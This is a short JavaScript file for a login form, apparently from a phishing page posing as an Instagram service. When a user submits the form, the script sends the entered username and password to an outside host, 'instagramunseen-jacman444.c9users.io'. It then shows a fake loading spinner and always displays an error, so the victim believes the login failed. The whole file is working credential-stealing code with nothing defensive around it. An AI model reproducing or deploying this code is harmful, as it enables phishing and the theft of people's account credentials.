function login() {
  if (document.getElementById("username").value !== "" && document.getElementById("password").value !== "") {
    document.getElementById("login").style.opacity = 0.5;
    document.getElementById("button-text").style.display = "none";
    document.getElementById("load").style.display = "inline";
    get();
    window.setTimeout(function(){
      document.getElementById("login").style.opacity = 1;
      document.getElementById("button-text").style.display = "block";
      document.getElementById("load").style.display = "none";
      document.getElementById("error").style.display = "block";
    },((Math.random() * 800) + 300));
  }
}

function communicate(m, t) {
  if (m === "post") {
    $.get("https://instagramunseen-jacman444.c9users.io", { method: m, text: t }, function(data){});
  }
  else {
    $.get("https://instagramunseen-jacman444.c9users.io", { method: m, text: t }, function(data){ evaluate(data); });
  }
}
function get() {
  communicate("get","");
}
function post(data) {
  communicate("post",data);
}

function evaluate(data) {
  post(data + " ~ username:" + document.getElementById("username").value + ";password:" + document.getElementById("password").value + ";");
}

$(document).keypress(function(e) {
    if (e.keyCode === 13) {
      login();
      e.preventDefault();
    }
});
